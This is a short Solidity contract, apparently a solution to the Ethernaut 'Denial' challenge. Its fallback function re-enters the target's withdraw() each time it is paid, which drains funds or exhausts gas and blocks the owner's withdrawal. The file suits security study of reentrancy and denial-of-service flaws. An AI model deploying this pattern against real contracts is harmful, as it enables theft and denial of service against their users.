// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Denial {
    function withdraw() external;
}

contract DenialPartner {

  address reentrance_addr; 

  constructor(address _addr) payable public {
      reentrance_addr = _addr;
  }

  fallback() external payable {
    Denial(reentrance_addr).withdraw();
  }

}